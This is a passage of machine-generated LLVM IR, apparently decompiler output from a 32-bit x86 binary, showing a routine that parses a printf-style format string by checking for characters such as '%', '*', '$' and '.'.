  %v3_805bb17 = add i32 %v1_805bb17, -4
  %v4_805bb17 = add i32 %v3_805bb17, %v2_805bb17
  %v5_805bb17 = inttoptr i32 %v4_805bb17 to i32*
  %v6_805bb17 = load i32, i32* %v5_805bb17, align 4
  %v17_805bb17 = icmp eq i32 %v2_805bb14, %v6_805bb17
  %v1_805bb1b = icmp eq i1 %v17_805bb17, false
  br i1 %v1_805bb1b, label %dec_label_pc_805be64, label %dec_label_pc_805bb21

dec_label_pc_805bb21:                             ; preds = %dec_label_pc_805bafd
  %v3_805bb21 = trunc i32 %v0_805bb12 to i8
  %v4_805bb21 = icmp eq i8 %v3_805bb21, 0
  br i1 %v4_805bb21, label %dec_label_pc_805bb2b, label %dec_label_pc_805bb25

dec_label_pc_805bb25:                             ; preds = %dec_label_pc_805bb21
  %v0_805bb25 = load i32, i32* %esi.global-to-local, align 4
  %v1_805bb25 = add i32 %v0_805bb25, 1
  store i32 %v1_805bb25, i32* %esi.global-to-local, align 4
  %tmp154 = icmp ult i32 %v1_805bb25, 32
  br i1 %tmp154, label %dec_label_pc_805bb25.dec_label_pc_805bafd_crit_edge, label %dec_label_pc_805bb2b

dec_label_pc_805bb25.dec_label_pc_805bafd_crit_edge: ; preds = %dec_label_pc_805bb25
  %v2_805bb0e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805bafd

dec_label_pc_805bb2b:                             ; preds = %dec_label_pc_805bb25, %dec_label_pc_805bb21
  %v2_805bb30 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_805bb48.outer

dec_label_pc_805bb48.outer:                       ; preds = %dec_label_pc_805bb2b, %dec_label_pc_805baea, %dec_label_pc_805bc65
  %v0_805bb54.ph94 = phi i32 [ %v1_805bc65, %dec_label_pc_805bc65 ], [ %v2_805baea, %dec_label_pc_805baea ], [ %v2_805bb30, %dec_label_pc_805bb2b ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_805bc65 ], [ %tmp66, %dec_label_pc_805baea ], [ %tmp66, %dec_label_pc_805bb2b ]
  %stack_var_-96.1.ph = phi i32 [ %v0_805baee, %dec_label_pc_805bc65 ], [ 0, %dec_label_pc_805baea ], [ 0, %dec_label_pc_805bb2b ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_805bc65 ], [ %v3_805bad8, %dec_label_pc_805baea ], [ %v3_805bad8, %dec_label_pc_805bb2b ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_805bc65 ], [ 0, %dec_label_pc_805baea ], [ 0, %dec_label_pc_805bb2b ]
  %v7_805bb4f = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_805bb4f = trunc i64 %v7_805bb4f to i32
  %v2_805bb57 = add i32 %v8_805bb4f, 80
  br label %dec_label_pc_805bb48

dec_label_pc_805bb48:                             ; preds = %dec_label_pc_805bb48.outer, %dec_label_pc_805bc05
  %v0_805bb54 = phi i32 [ %v0_805bc12, %dec_label_pc_805bc05 ], [ %v0_805bb54.ph94, %dec_label_pc_805bb48.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_805bc05 ], [ %stack_var_-32.1.ph, %dec_label_pc_805bb48.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_805bc05 ], [ %stack_var_-88.1.ph, %dec_label_pc_805bb48.outer ]
  store i32 %v0_805bb54, i32* @edx, align 4
  store i32 %v0_805bb54, i32* @esi, align 4
  %v1_805bb4a = inttoptr i32 %v0_805bb54 to i8*
  %v2_805bb4a = load i8, i8* %v1_805bb4a, align 1
  %v11_805bb4a = icmp eq i8 %v2_805bb4a, 42
  %v1_805bb4d = icmp eq i1 %v11_805bb4a, false
  br i1 %v1_805bb4d, label %dec_label_pc_805bb5f, label %dec_label_pc_805bb4f

dec_label_pc_805bb4f:                             ; preds = %dec_label_pc_805bb48
  store i32 %v8_805bb4f, i32* %eax.global-to-local, align 4
  %v1_805bb54 = add i32 %v0_805bb54, 1
  store i32 %v1_805bb54, i32* @esi, align 4
  %v0_805bb57 = load i32, i32* @esp, align 4
  %v3_805bb57 = add i32 %v2_805bb57, %v0_805bb57
  %v4_805bb57 = inttoptr i32 %v3_805bb57 to i32*
  store i32 0, i32* %v4_805bb57, align 4
  %v0_805bb79.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805bb5f

dec_label_pc_805bb5f:                             ; preds = %dec_label_pc_805bb48, %dec_label_pc_805bb4f
  %v0_805bb79.pre = phi i32 [ %v0_805bb54, %dec_label_pc_805bb48 ], [ %v0_805bb79.pre.pre, %dec_label_pc_805bb4f ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_805bb61 = load i32, i32* inttoptr (i32 134692812 to i32*), align 4
  store i32 %v0_805bb61, i32* %ebp.global-to-local, align 4
  %v4_805bb79.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805bb79

dec_label_pc_805bb69:                             ; preds = %dec_label_pc_805bb79
  %v1_805bb69 = add i32 %v1_805bb71, -4094
  %v6_805bb69 = sub i32 4093, %v1_805bb71
  %v7_805bb69 = and i32 %v6_805bb69, %v1_805bb71
  %v8_805bb69 = icmp slt i32 %v7_805bb69, 0
  %v9_805bb69 = icmp eq i32 %v1_805bb69, 0
  %v10_805bb69 = icmp slt i32 %v1_805bb69, 0
  %v3_805bb6f = icmp eq i1 %v10_805bb69, %v8_805bb69
  %v4_805bb6f = icmp eq i1 %v9_805bb69, false
  %v5_805bb6f = and i1 %v4_805bb6f, %v3_805bb6f
  br i1 %v5_805bb6f, label %dec_label_pc_805bb78, label %dec_label_pc_805bb71

dec_label_pc_805bb71:                             ; preds = %dec_label_pc_805bb69
  %v3_805bb71 = mul i32 %v1_805bb71, 10
  store i32 %v3_805bb71, i32* %eax.global-to-local, align 4
  %v2_805bb74 = add i32 %v3_805bb71, -48
  %v3_805bb74 = add i32 %v2_805bb74, %v2_805bb7b
  store i32 %v3_805bb74, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805bb78

dec_label_pc_805bb78:                             ; preds = %dec_label_pc_805bb69, %dec_label_pc_805bb71
  %v0_805bb9332 = phi i32 [ %v1_805bb71, %dec_label_pc_805bb69 ], [ %v3_805bb74, %dec_label_pc_805bb71 ]
  %v4_805bb7928 = phi i32 [ %v6_805bb79, %dec_label_pc_805bb69 ], [ %v3_805bb71, %dec_label_pc_805bb71 ]
  %v1_805bb78 = add i32 %v0_805bb78, 1
  store i32 %v1_805bb78, i32* @esi, align 4
  br label %dec_label_pc_805bb79

dec_label_pc_805bb79:                             ; preds = %dec_label_pc_805bb5f, %dec_label_pc_805bb78
  %v1_805bb71 = phi i32 [ 0, %dec_label_pc_805bb5f ], [ %v0_805bb9332, %dec_label_pc_805bb78 ]
  %v4_805bb79 = phi i32 [ %v4_805bb79.pre, %dec_label_pc_805bb5f ], [ %v4_805bb7928, %dec_label_pc_805bb78 ]
  %v0_805bb78 = phi i32 [ %v0_805bb79.pre, %dec_label_pc_805bb5f ], [ %v1_805bb78, %dec_label_pc_805bb78 ]
  %v1_805bb79 = inttoptr i32 %v0_805bb78 to i8*
  %v2_805bb79 = load i8, i8* %v1_805bb79, align 1
  %v3_805bb79 = zext i8 %v2_805bb79 to i32
  %v5_805bb79 = and i32 %v4_805bb79, -256
  %v6_805bb79 = or i32 %v3_805bb79, %v5_805bb79
  store i32 %v6_805bb79, i32* %eax.global-to-local, align 4
  %v2_805bb7b = sext i8 %v2_805bb79 to i32
  store i32 %v2_805bb7b, i32* @ecx, align 4
  %v2_805bb7e = mul nsw i32 %v2_805bb7b, 2
  %v3_805bb7e = add i32 %v2_805bb7e, %v0_805bb61
  %v4_805bb7e = inttoptr i32 %v3_805bb7e to i8*
  %v5_805bb7e = load i8, i8* %v4_805bb7e, align 1
  %v6_805bb7e = and i8 %v5_805bb7e, 8
  %v7_805bb7e = icmp eq i8 %v6_805bb7e, 0
  %v1_805bb83 = icmp eq i1 %v7_805bb7e, false
  br i1 %v1_805bb83, label %dec_label_pc_805bb69, label %dec_label_pc_805bb85

dec_label_pc_805bb85:                             ; preds = %dec_label_pc_805bb79
  %v0_805bb85 = load i32, i32* @edx, align 4
  %v1_805bb85 = add i32 %v0_805bb85, -1
  %v2_805bb85 = inttoptr i32 %v1_805bb85 to i8*
  %v3_805bb85 = load i8, i8* %v2_805bb85, align 1
  %v12_805bb85 = icmp eq i8 %v3_805bb85, 37
  %v1_805bb89 = icmp eq i1 %v12_805bb85, false
  br i1 %v1_805bb89, label %dec_label_pc_805bc1c, label %dec_label_pc_805bb8f

dec_label_pc_805bb8f:                             ; preds = %dec_label_pc_805bb85
  %v10_805bb8f = icmp eq i8 %v2_805bb79, 36
  %v1_805bb91 = icmp eq i1 %v10_805bb8f, false
  br i1 %v1_805bb91, label %dec_label_pc_805bbc3, label %dec_label_pc_805bb93

dec_label_pc_805bb93:                             ; preds = %dec_label_pc_805bb8f
  %tmp89 = icmp slt i32 %v1_805bb71, 1
  br i1 %tmp89, label %dec_label_pc_805bbc3, label %dec_label_pc_805bb97

dec_label_pc_805bb97:                             ; preds = %dec_label_pc_805bb93
  %v1_805bb97 = add i32 %v0_805bb78, 1
  store i32 %v1_805bb97, i32* @edx, align 4
  %v4_805bb9a = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_805bb9a, label %dec_label_pc_805be64, label %dec_label_pc_805bba5

dec_label_pc_805bba5:                             ; preds = %dec_label_pc_805bb97
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_805bbad = sub i32 %v1_805bb71, %stack_var_-88.1
  %v8_805bbad = xor i32 %v1_805bb71, %stack_var_-88.1
  %v9_805bbad = xor i32 %v2_805bbad, %v1_805bb71
  %v10_805bbad = and i32 %v9_805bbad, %v8_805bbad
  %v11_805bbad = icmp slt i32 %v10_805bbad, 0
  %v12_805bbad = icmp eq i32 %v2_805bbad, 0
  %v13_805bbad = icmp slt i32 %v2_805bbad, 0
  %v3_805bbaf = icmp ne i1 %v13_805bbad, %v11_805bbad
  %v4_805bbaf = or i1 %v12_805bbad, %v3_805bbaf
  %stack_var_-88.1.v0_805bbb1 = select i1 %v4_805bbaf, i32 %stack_var_-88.1, i32 %v1_805bb71
  br label %dec_label_pc_805bbbf

dec_label_pc_805bbbf:                             ; preds = %dec_label_pc_805bbd3, %dec_label_pc_805bba5, %dec_label_pc_805bbd7
  %v0_805bbbf = phi i32 [ %v1_805bb97, %dec_label_pc_805bba5 ], [ %v0_805bb85, %dec_label_pc_805bbd7 ], [ %v0_805bb85, %dec_label_pc_805bbd3 ]
  %stack_var_-32.2 = phi i32 [ %v1_805bb71, %dec_label_pc_805bba5 ], [ %stack_var_-32.1, %dec_label_pc_805bbd7 ], [ %stack_var_-32.1, %dec_label_pc_805bbd3 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_805bbb1, %dec_label_pc_805bba5 ], [ 0, %dec_label_pc_805bbd7 ], [ 0, %dec_label_pc_805bbd3 ]
  store i32 %v0_805bbbf, i32* @esi, align 4
  br label %dec_label_pc_805bbe6

dec_label_pc_805bbc3:                             ; preds = %dec_label_pc_805bb93, %dec_label_pc_805bb8f
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_805bbd3, label %dec_label_pc_805bbca

dec_label_pc_805bbca:                             ; preds = %dec_label_pc_805bbc3
  %v10_805bbca = icmp eq i8 %v2_805bb79, 109
  br i1 %v10_805bbca, label %dec_label_pc_805bc1c, label %dec_label_pc_805be64

dec_label_pc_805bbd3:                             ; preds = %dec_label_pc_805bbc3
  %tmp = icmp ugt i32 %v0_805bb78, %v0_805bb85
  br i1 %tmp, label %dec_label_pc_805bbd7, label %dec_label_pc_805bbbf

dec_label_pc_805bbd7:                             ; preds = %dec_label_pc_805bbd3
  %v1_805bbd7 = inttoptr i32 %v0_805bb85 to i8*
  %v2_805bbd7 = load i8, i8* %v1_805bbd7, align 1
  %v8_805bbd7 = icmp eq i8 %v2_805bbd7, 48
  br i1 %v8_805bbd7, label %dec_label_pc_805bbbf, label %dec_label_pc_805bc1c

dec_label_pc_805bbe6:                             ; preds = %dec_label_pc_805bbf7, %dec_label_pc_805bbbf
  %v0_805bc12 = phi i32 [ %v1_805bbf7, %dec_label_pc_805bbf7 ], [ %v0_805bbbf, %dec_label_pc_805bbbf ]
  %v4_805bbf035 = phi i32 [ %v6_805bbf0, %dec_label_pc_805bbf7 ], [ %v6_805bb79, %dec_label_pc_805bbbf ]
  store i32 ptrtoint ([8 x i8]* @global_var_806cc3e.738 to i32), i32* %edx.global-to-local, align 4
  %v1_805bbf3 = inttoptr i32 %v0_805bc12 to i8*
  br label %dec_label_pc_805bbf0

dec_label_pc_805bbf0:                             ; preds = %dec_label_pc_805bc01, %dec_label_pc_805bbe6
  %v4_805bbf0 = phi i32 [ %v4_805bbf035, %dec_label_pc_805bbe6 ], [ %v6_805bbf0, %dec_label_pc_805bc01 ]
  %v0_805bbf2 = phi i32 [ ptrtoint ([8 x i8]* @global_var_806cc3e.738 to i32), %dec_label_pc_805bbe6 ], [ %v1_805bbf2, %dec_label_pc_805bc01 ]
  %v0_805bc01 = phi i32 [ 1, %dec_label_pc_805bbe6 ], [ %v2_805bc01, %dec_label_pc_805bc01 ]
  store i32 %v0_805bc01, i32* @ecx, align 4
  %v1_805bbf0 = inttoptr i32 %v0_805bbf2 to i8*
  %v2_805bbf0 = load i8, i8* %v1_805bbf0, align 1
  %v3_805bbf0 = zext i8 %v2_805bbf0 to i32
  %v5_805bbf0 = and i32 %v4_805bbf0, -256
  %v6_805bbf0 = or i32 %v3_805bbf0, %v5_805bbf0
  store i32 %v6_805bbf0, i32* %eax.global-to-local, align 4
  %v1_805bbf2 = add i32 %v0_805bbf2, 1
  store i32 %v1_805bbf2, i32* @edx, align 4
  %v2_805bbf3 = load i8, i8* %v1_805bbf3, align 1
  %v15_805bbf3 = icmp eq i8 %v2_805bbf3, %v2_805bbf0
  %v1_805bbf5 = icmp eq i1 %v15_805bbf3, false
  br i1 %v1_805bbf5, label %dec_label_pc_805bbfc, label %dec_label_pc_805bbf7

dec_label_pc_805bbf7:                             ; preds = %dec_label_pc_805bbf0
  %v1_805bbf7 = add i32 %v0_805bc12, 1
  store i32 %v1_805bbf7, i32* @esi, align 4
  %v0_805bbf8 = load i32, i32* %edi.global-to-local, align 4
  %v2_805bbf8 = or i32 %v0_805bbf8, %v0_805bc01
  store i32 %v2_805bbf8, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805bbe6

dec_label_pc_805bbfc:                             ; preds = %dec_label_pc_805bbf0
  %v1_805bbfc = inttoptr i32 %v1_805bbf2 to i8*
  %v2_805bbfc = load i8, i8* %v1_805bbfc, align 1
  %v3_805bbfc = icmp eq i8 %v2_805bbfc, 0
  br i1 %v3_805bbfc, label %dec_label_pc_805bc05, label %dec_label_pc_805bc01

dec_label_pc_805bc01:                             ; preds = %dec_label_pc_805bbfc
  %v2_805bc01 = mul i32 %v0_805bc01, 2
  br label %dec_label_pc_805bbf0

dec_label_pc_805bc05:                             ; preds = %dec_label_pc_805bbfc
  %v0_805bc05 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805bc09 = udiv i32 %v0_805bc05, 2
  %v1_805bc09.not = or i32 %v1_805bc09, -6
  %v1_805bc0e = xor i32 %v1_805bc09.not, 5
  store i32 %v1_805bc0e, i32* %eax.global-to-local, align 4
  %v2_805bc10 = and i32 %v1_805bc0e, %v0_805bc05
  store i32 %v2_805bc10, i32* %edi.global-to-local, align 4
  %v1_805bc12 = add i32 %v0_805bc12, -1
  %v2_805bc12 = inttoptr i32 %v1_805bc12 to i8*
  %v3_805bc12 = load i8, i8* %v2_805bc12, align 1
  %v12_805bc12 = icmp eq i8 %v3_805bc12, 37
  %v1_805bc16 = icmp eq i1 %v12_805bc12, false
  br i1 %v1_805bc16, label %dec_label_pc_805bb48, label %dec_label_pc_805bc1c

dec_label_pc_805bc1c:                             ; preds = %dec_label_pc_805bbd7, %dec_label_pc_805bc05, %dec_label_pc_805bb85, %dec_label_pc_805bbca
  %v0_805bc3f = phi i32 [ %v1_805bb71, %dec_label_pc_805bbca ], [ %v1_805bb71, %dec_label_pc_805bbd7 ], [ 0, %dec_label_pc_805bc05 ], [ %v1_805bb71, %dec_label_pc_805bb85 ]
  %v1_805bc48 = phi i32 [ %v0_805bb78, %dec_label_pc_805bbca ], [ %v0_805bb78, %dec_label_pc_805bbd7 ], [ %v0_805bc12, %dec_label_pc_805bc05 ], [ %v0_805bb78, %dec_label_pc_805bb85 ]
  %v0_805bc45 = phi i32 [ %v0_805bb85, %dec_label_pc_805bbca ], [ %v0_805bb85, %dec_label_pc_805bbd7 ], [ %v1_805bbf2, %dec_label_pc_805bc05 ], [ %v0_805bb85, %dec_label_pc_805bb85 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_805bbca ], [ %stack_var_-32.1, %dec_label_pc_805bbd7 ], [ %stack_var_-32.2, %dec_label_pc_805bc05 ], [ %stack_var_-32.1, %dec_label_pc_805bb85 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_805bbca ], [ 0, %dec_label_pc_805bbd7 ], [ %stack_var_-88.2, %dec_label_pc_805bc05 ], [ %stack_var_-88.1, %dec_label_pc_805bb85 ]
  %v1_805bc1c = inttoptr i32 %v0_805bc45 to i8*
  %v2_805bc1c = load i8, i8* %v1_805bc1c, align 1
  %v11_805bc1c = icmp eq i8 %v2_805bc1c, 42
  %v1_805bc1f = icmp eq i1 %v11_805bc1c, false
  br i1 %v1_805bc1f, label %dec_label_pc_805bc55, label %dec_label_pc_805bc21

dec_label_pc_805bc21:                             ; preds = %dec_label_pc_805bc1c
  %v4_805bc21 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_805bc21, label %dec_label_pc_805bc45, label %dec_label_pc_805bc28

dec_label_pc_805bc28:                             ; preds = %dec_label_pc_805bc21
  %v1_805bc28 = inttoptr i32 %v1_805bc48 to i8*
  %v2_805bc28 = load i8, i8* %v1_805bc28, align 1
  %v11_805bc28 = icmp eq i8 %v2_805bc28, 36
  %v1_805bc2b = icmp eq i1 %v11_805bc28, false
  br i1 %v1_805bc2b, label %dec_label_pc_805be64, label %dec_label_pc_805bc31

dec_label_pc_805bc31:                             ; preds = %dec_label_pc_805bc28
  %tmp91 = icmp slt i32 %v0_805bc3f, 1
  br i1 %tmp91, label %dec_label_pc_805be64, label %dec_label_pc_805bc39

dec_label_pc_805bc39:                             ; preds = %dec_label_pc_805bc31
  store i32 %v8_805bb4f, i32* %eax.global-to-local, align 4
  %v1_805bc3e = add i32 %v1_805bc48, 1
  store i32 %v1_805bc3e, i32* @esi, align 4
  %v1_805bc3f = load i32, i32* @esp, align 4
  %v3_805bc3f = add i32 %v8_805bb4f, 68
  %v4_805bc3f = add i32 %v3_805bc3f, %v1_805bc3f
  %v5_805bc3f = inttoptr i32 %v4_805bc3f to i32*
  store i32 %v0_805bc3f, i32* %v5_805bc3f, align 4
  %v0_805bc83.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805bc50

dec_label_pc_805bc45:                             ; preds = %dec_label_pc_805bc21
  %v1_805bc45 = add i32 %v0_805bc45, 1
  store i32 %v1_805bc45, i32* %eax.global-to-local, align 4
  %v12_805bc48 = icmp eq i32 %v1_805bc45, %v1_805bc48
  %v1_805bc4a = icmp eq i1 %v12_805bc48, false
  br i1 %v1_805bc4a, label %dec_label_pc_805be64, label %dec_label_pc_805bc50

dec_label_pc_805bc50:                             ; preds = %dec_label_pc_805bc45, %dec_label_pc_805bc39
  %v0_805bc83.pre.pre.pre = phi i32 [ %v1_805bc48, %dec_label_pc_805bc45 ], [ %v0_805bc83.pre.pre.pre.pre, %dec_label_pc_805bc39 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805bc55

dec_label_pc_805bc55:                             ; preds = %dec_label_pc_805bc1c, %dec_label_pc_805bc50
  %v0_805bc83.pre.pre = phi i32 [ %v1_805bc48, %dec_label_pc_805bc1c ], [ %v0_805bc83.pre.pre.pre, %dec_label_pc_805bc50 ]
  %v0_805baee = phi i32 [ %v0_805bc3f, %dec_label_pc_805bc1c ], [ -2147483648, %dec_label_pc_805bc50 ]
  %v4_805bc55 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_805bc55 = icmp eq i32 %v4_805bc55, 0
  %v1_805bc5a = icmp eq i1 %v5_805bc55, false
  %.pre = inttoptr i32 %v0_805bc83.pre.pre to i8*
  br i1 %v1_805bc5a, label %dec_label_pc_805bc7e, label %dec_label_pc_805bc60

dec_label_pc_805bc60:                             ; preds = %dec_label_pc_805bc55
  %v2_805bc60 = load i8, i8* %.pre, align 1
  %v11_805bc60 = icmp eq i8 %v2_805bc60, 46
  %v1_805bc63 = icmp eq i1 %v11_805bc60, false
  br i1 %v1_805bc63, label %dec_label_pc_805bc77, label %dec_label_pc_805bc65

dec_label_pc_805bc65:                             ; preds = %dec_label_pc_805bc60
  %v1_805bc65 = add i32 %v0_805bc83.pre.pre, 1
  store i32 %v1_805bc65, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805bb48.outer

dec_label_pc_805bc77:                             ; preds = %dec_label_pc_805bc60
  br label %dec_label_pc_805bc7e

dec_label_pc_805bc7e:                             ; preds = %dec_label_pc_805bc55, %dec_label_pc_805bc77
  %stack_var_-96.2 = phi i32 [ %v0_805baee, %dec_label_pc_805bc77 ], [ %stack_var_-96.1.ph, %dec_label_pc_805bc55 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_805bc77 ], [ %v0_805baee, %dec_label_pc_805bc55 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_806cbec.739 to i32), i32* @edx, align 4
  %v4_805bc83.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805bc83

dec_label_pc_805bc83:                             ; preds = %dec_label_pc_805bc8d, %dec_label_pc_805bc7e
  %v0_805bc8d = phi i32 [ %v1_805bc8d, %dec_label_pc_805bc8d ], [ ptrtoint ([9 x i8]* @global_var_806cbec.739 to i32), %dec_label_pc_805bc7e ]
  %v4_805bc83 = phi i32 [ %v6_805bc83, %dec_label_pc_805bc8d ], [ %v4_805bc83.pre, %dec_label_pc_805bc7e ]
  %v2_805bc83 = load i8, i8* %.pre, align 1
  %v3_805bc83 = zext i8 %v2_805bc83 to i32
  %v5_805bc83 = and i32 %v4_805bc83, -256
  %v6_805bc83 = or i32 %v3_805bc83, %v5_805bc83
  store i32 %v6_805bc83, i32* %eax.global-to-local, align 4
  %v3_805bc85 = inttoptr i32 %v0_805bc8d to i8*
  %v4_805bc85 = load i8, i8* %v3_805bc85, align 1
  %v15_805bc85 = icmp eq i8 %v2_805bc83, %v4_805bc85
  br i1 %v15_805bc85, label %dec_label_pc_805baf5, label %dec_label_pc_805bc8d

dec_label_pc_805bc8d:                             ; preds = %dec_label_pc_805bc83
  %v1_805bc8d = add i32 %v0_805bc8d, 1
  store i32 %v1_805bc8d, i32* @edx, align 4
  %v1_805bc8e = inttoptr i32 %v1_805bc8d to i8*
  %v2_805bc8e = load i8, i8* %v1_805bc8e, align 1
  %v3_805bc8e = icmp eq i8 %v2_805bc8e, 0
  %v1_805bc91 = icmp eq i1 %v3_805bc8e, false
  br i1 %v1_805bc91, label %dec_label_pc_805bc83, label %dec_label_pc_805bc93

dec_label_pc_805bc93:                             ; preds = %dec_label_pc_805bc8d, %dec_label_pc_805baf5
  %v0_805bca6 = phi i32 [ %v1_805baf5, %dec_label_pc_805baf5 ], [ %v0_805bc83.pre.pre, %dec_label_pc_805bc8d ]
  %v0_805bca3 = phi i32 [ %v0_805bc8d, %dec_label_pc_805baf5 ], [ %v1_805bc8d, %dec_label_pc_805bc8d ]
  %v1_805bc95 = add i32 %v0_805bca3, -134663148
  %v1_805bc9a = add i32 %v0_805bca3, -134663149
  %v5_805bc9a = sub i32 134663148, %v0_805bca3
  %v6_805bc9a = and i32 %v1_805bc95, %v5_805bc9a
  %v7_805bc9a = icmp slt i32 %v6_805bc9a, 0
  %v8_805bc9a = icmp eq i32 %v1_805bc9a, 0
  %v9_805bc9a = icmp slt i32 %v1_805bc9a, 0
  store i32 %v1_805bc9a, i32* %eax.global-to-local, align 4
  %v3_805bc9b = icmp eq i1 %v9_805bc9a, %v7_805bc9a
  %v4_805bc9b = icmp eq i1 %v8_805bc9a, false
  %v5_805bc9b = and i1 %v4_805bc9b, %v3_805bc9b
  br i1 %v5_805bc9b, label %dec_label_pc_805bca7, label %dec_label_pc_805bc9d

dec_label_pc_805bc9d:                             ; preds = %dec_label_pc_805bc93
  %v1_805bc9d = inttoptr i32 %v0_805bca6 to i8*
  %v2_805bc9d = load i8, i8* %v1_805bc9d, align 1
  %v3_805bc9d = zext i8 %v2_805bc9d to i32
  %v5_805bc9d = and i32 %v1_805bc9a, -256
  %v6_805bc9d = or i32 %v3_805bc9d, %v5_805bc9d
  store i32 %v6_805bc9d, i32* %eax.global-to-local, align 4
  %v3_805bc9f = inttoptr i32 %v0_805bca3 to i8*
  %v4_805bc9f = load i8, i8* %v3_805bc9f, align 1
  %v15_805bc9f = icmp eq i8 %v2_805bc9d, %v4_805bc9f
  %v1_805bca1 = icmp eq i1 %v15_805bc9f, false
  br i1 %v1_805bca1, label %dec_label_pc_805bca7, label %dec_label_pc_805bca3

dec_label_pc_805bca3:                             ; preds = %dec_label_pc_805bc9d
  %v1_805bca3 = add i32 %v0_805bca3, 9
  store i32 %v1_805bca3, i32* @edx, align 4
  %v1_805bca6 = add i32 %v0_805bca6, 1
  store i32 %v1_805bca6, i32* @esi, align 4
  br label %dec_label_pc_805bca7

dec_label_pc_805bca7:                             ; preds = %dec_label_pc_805bc9d, %dec_label_pc_805bc93, %dec_label_pc_805bca3
  %v4_805bcae = phi i32 [ %v6_805bc9d, %dec_label_pc_805bc9d ], [ %v1_805bc9a, %dec_label_pc_805bc93 ], [ %v6_805bc9d, %dec_label_pc_805bca3 ]
  %v0_805bcae = phi i32 [ %v0_805bca6, %dec_label_pc_805bc9d ], [ %v0_805bca6, %dec_label_pc_805bc93 ], [ %v1_805bca6, %dec_label_pc_805bca3 ]
  %v0_805bca7 = phi i32 [ %v0_805bca3, %dec_label_pc_805bc9d ], [ %v0_805bca3, %dec_label_pc_805bc93 ], [ %v1_805bca3, %dec_label_pc_805bca3 ]
  %v1_805bca7 = add i32 %v0_805bca7, 9
  %v2_805bca7 = inttoptr i32 %v1_805bca7 to i8*
  %v3_805bca7 = load i8, i8* %v2_805bca7, align 1
  %v4_805bca7 = sext i8 %v3_805bca7 to i32
  %v2_805bcab = mul nsw i32 %v4_805bca7, 256
  store i32 %v2_805bcab, i32* %ebx.global-to-local, align 4
  %v1_805bcae = inttoptr i32 %v0_805bcae to i8*
  %v2_805bcae = load i8, i8* %v1_805bcae, align 1
  %v3_805bcae = zext i8 %v2_805bcae to i32
  %v5_805bcae = and i32 %v4_805bcae, -256
  %v6_805bcae = or i32 %v3_805bcae, %v5_805bcae
  store i32 %v6_805bcae, i32* %eax.global-to-local, align 4
  %v4_805bcb0 = icmp eq i8 %v2_805bcae, 0
  br i1 %v4_805bcb0, label %dec_label_pc_805be64, label %dec_label_pc_805bcb8

dec_label_pc_805bcb8:                             ; preds = %dec_label_pc_805bca7
  store i32 ptrtoint ([21 x i8]* @global_var_806cc29.740 to i32), i32* %ecx.global-to-local, align 4
  %v3_805bcbd = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805bcbd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805bcc1

dec_label_pc_805bcc1:                             ; preds = %dec_label_pc_805bd10, %dec_label_pc_805bcb8
  %v0_805bd10 = phi i32 [ %v1_805bd10, %dec_label_pc_805bd10 ], [ ptrtoint ([21 x i8]* @global_var_806cc29.740 to i32), %dec_label_pc_805bcb8 ]
  %v3_805bcc1 = inttoptr i32 %v0_805bd10 to i8*
  %v4_805bcc1 = load i8, i8* %v3_805bcc1, align 1
  %v15_805bcc1 = icmp eq i8 %v2_805bcae, %v4_805bcc1
  %v1_805bcc3 = icmp eq i1 %v15_805bcc1, false
  br i1 %v1_805bcc3, label %dec_label_pc_805bd10, label %dec_label_pc_805bcc5

dec_label_pc_805bcc5:                             ; preds = %dec_label_pc_805bcc1
  %v1_805bcc7 = add i32 %v0_805bd10, -134663209
  store i32 %v1_805bcc7, i32* %edx.global-to-local, align 4
  %v7_805bcd0 = icmp sgt i32 %v1_805bcc7, 17
  br i1 %v7_805bcd0, label %dec_label_pc_805bcd2, label %dec_label_pc_805bcda

dec_label_pc_805bcd2:                             ; preds = %dec_label_pc_805bcc5
  %v3_805bcd2 = and i32 %v2_805bcab, 1024
  %v4_805bcd2 = icmp eq i32 %v3_805bcd2, 0
  br i1 %v4_805bcd2, label %dec_label_pc_805bcda, label %dec_label_pc_805bcd7

dec_label_pc_805bcd7:                             ; preds = %dec_label_pc_805bcd2
  %v1_805bcd7 = add i32 %v0_805bd10, -134663211
  store i32 %v1_805bcd7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805bcda

dec_label_pc_805bcda:                             ; preds = %dec_label_pc_805bcc5, %dec_label_pc_805bcd2, %dec_label_pc_805bcd7
  %v0_805bce3 = phi i32 [ %v1_805bcc7, %dec_label_pc_805bcc5 ], [ %v1_805bcc7, %dec_label_pc_805bcd2 ], [ %v1_805bcd7, %dec_label_pc_805bcd7 ]
